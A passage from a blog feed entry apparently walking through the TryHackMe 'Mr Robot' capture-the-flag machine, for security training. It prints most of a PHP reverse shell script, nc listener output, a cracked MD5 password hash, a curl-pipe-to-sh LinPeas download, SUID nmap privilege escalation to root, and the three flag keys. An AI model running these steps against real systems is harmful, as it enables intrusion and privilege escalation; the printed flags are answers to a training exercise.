   <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">),</span>  <span class="c1">// stdin is a pipe that the child will read from</span>
   <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">),</span>  <span class="c1">// stdout is a pipe that the child will write to</span>
   <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span>   <span class="c1">// stderr is a pipe that the child will write to</span>
<span class="p">);</span>

<span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
	<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Can't spawn shell"</span><span class="p">);</span>
	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

<span class="nf">printit</span><span class="p">(</span><span class="s2">"Successfully opened reverse shell to </span><span class="nv">$ip</span><span class="s2">:</span><span class="nv">$port</span><span class="s2">"</span><span class="p">);</span>

<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span>
		<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Shell connection terminated"</span><span class="p">);</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
		<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Shell process terminated"</span><span class="p">);</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
	<span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nb">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"SOCK READ"</span><span class="p">);</span>
		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"SOCK: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDOUT READ"</span><span class="p">);</span>
		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDOUT: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDERR READ"</span><span class="p">);</span>
		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nf">printit</span><span class="p">(</span><span class="s2">"STDERR: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="nb">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>

<span class="k">function</span> <span class="n">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">print</span> <span class="s2">"</span><span class="nv">$string</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</code></pre></div></div> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/H1eDtFEya.png" alt="Theme edit"/></p> <p>We put a nc listener with the port 6870</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 6870
</code></pre></div></div> <p>We can access to the archive.php with the URL https://10.10.150.113/wp-content/themes/twentyfifteen/archive.php so we can get the reverse shell:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 6870        
listening on <span class="o">[</span>any] 6870 ...
connect to <span class="o">[</span>10.11.24.118] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.150.113] 60344
Linux linux 3.13.0-55-generic <span class="c">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span>
 14:18:12 up  2:05,  0 <span class="nb">users</span>,  load average: 5.94, 5.60, 4.80
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami
daemon
$ ls /home
robot
$ ls /home/robot
key-2-of-3.txt
password.raw-md5
$ cat /home/robot/key-2-of-3.txt
cat: /home/robot/key-2-of-3.txt: Permission denied

</span></code></pre></div></div> <p>We can’t read to the key-2-of-3.txt so we need to do a privesc to get the access to the user <code class="language-plaintext highlighter-rouge">robot</code>. However, we can try to bruteforce the hashed md5 password with john the ripper or just use some online db if it already been cracket like https://crackstation.net.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
</code></pre></div></div> <p>After that, we found that the password is:</p> <table> <thead> <tr> <th style="text-align: center">Hash</th> <th style="text-align: center">Type</th> <th style="text-align: center">Result</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">c3fcd3d76192e4007dfb496cca67e13b</td> <td style="text-align: center">md5</td> <td style="text-align: center">abcdefghijklmnopqrstuvwxyz</td> </tr> </tbody> </table> <p>With it, we reconnect to the revshell and we spawn a new tty with python command:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
</code></pre></div></div> <p>If we don’t do this, when we would want to do su, the command will say that there is no tty.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su robot
password: 
<span class="nb">cat </span>key-2-of-3.txt
822c73956184f694993bede3eb39f959
</code></pre></div></div> <p><em>Key 2: <code class="language-plaintext highlighter-rouge">822c73956184f694993bede3eb39f959</code></em></p> <p>After that, we’ll look for another vulnerabilities present on the machine. To do that simply, we’ll upload LinPeas with python <code class="language-plaintext highlighter-rouge">http.server</code>.</p> <p>Kali:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-L</span> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
<span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 8000 <span class="c">#Host</span>
</code></pre></div></div> <p>Victim:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 10.10.145.120:8000/linpeas.sh <span class="o">&gt;</span> /tmp/linpeas.sh <span class="c">#Victim</span>
<span class="nb">chmod </span>777 /tmp/linpeas.sh
/tmp/linpeas.sh
</code></pre></div></div> <p>After execution, we can see that nmap is a vector of PrivEsc because it has SUID with root permissions on it. After cheecking on https://gtfobins.github.io/gtfobins/nmap/, we will use the interactive mode exploit.</p> <p>Victim</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--interactive</span>
<span class="o">!</span>sh
<span class="c"># whoami</span>
root
<span class="s2">" find -name "</span>key-3-of-3<span class="s2">"
/root/key-3-of-3.txt
# cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
</span></code></pre></div></div> <p><em>Key 3: <code class="language-plaintext highlighter-rouge">04787ddef27c3dee1ee161b21670b4e4</code></em></p>]]></content><author><name></name></author><category term="THM"/><category term="CTF"/><category term="Privilege Escalation"/><category term="Wordpress"/><summary type="html"><![CDATA[THM Mr Robot CTF]]></summary></entry></feed>